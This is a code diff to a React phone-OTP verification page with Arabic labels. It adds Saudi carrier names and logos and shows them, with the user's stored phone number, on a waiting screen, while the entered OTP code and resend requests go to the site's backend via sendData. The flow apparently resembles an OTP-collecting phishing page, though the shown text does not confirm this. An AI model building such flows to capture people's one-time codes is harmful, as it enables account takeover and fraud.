@@ -1,7 +1,7 @@
 import { useEffect, useState, useRef } from "react";
 import { useLocation, useSearch } from "wouter";
 import PageLayout from "@/components/layout/PageLayout";
-import WaitingOverlay from "@/components/WaitingOverlay";
+import WaitingOverlay, { waitingProviderInfo } from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import {
@@ -19,6 +19,16 @@ const serviceProviderNextPages: Record<string, string> = {
   "3": "الصفحة النهائية",
   "4": "الصفحة النهائية",
   "5": "الصفحة النهائية",
+};
+
+// معلومات مزودي الخدمة
+const serviceProviders: Record<string, { label: string; icon: string }> = {
+  "0": { label: "STC", icon: "/images/service-providers/stc.jpg" },
+  "1": { label: "موبايلي", icon: "/images/service-providers/mobily.png" },
+  "2": { label: "زين", icon: "/images/service-providers/zain.webp" },
+  "3": { label: "ليبارا", icon: "/images/service-providers/lebara.jpg" },
+  "4": { label: "فيرجن", icon: "/images/service-providers/virgin.png" },
+  "5": { label: "سلام", icon: "/images/service-providers/salam.jpg" },
 };
 
 export default function PhoneOTP() {
@@ -93,6 +103,17 @@ export default function PhoneOTP() {
     }
 
     setError(false);
+    
+    // تعيين معلومات مزود الخدمة لعرضها في شاشة الانتظار
+    const provider = serviceProviders[serviceProvider];
+    const phoneNumber = localStorage.getItem('userPhone') || '';
+    
+    waitingProviderInfo.value = {
+      providerLogo: provider?.icon,
+      providerName: provider?.label,
+      phoneNumber: phoneNumber,
+    };
+    
     sendData({
       digitCode: otp,
       current: "تحقق رقم الجوال (OTP)",
@@ -102,6 +123,16 @@ export default function PhoneOTP() {
   };
 
   const handleResend = () => {
+    // تعيين معلومات مزود الخدمة لعرضها في شاشة الانتظار
+    const provider = serviceProviders[serviceProvider];
+    const phoneNumber = localStorage.getItem('userPhone') || '';
+    
+    waitingProviderInfo.value = {
+      providerLogo: provider?.icon,
+      providerName: provider?.label,
+      phoneNumber: phoneNumber,
+    };
+    
     sendData({
       data: { طلب: "إعادة إرسال رمز" },
       current: "تحقق رقم الجوال (OTP)",
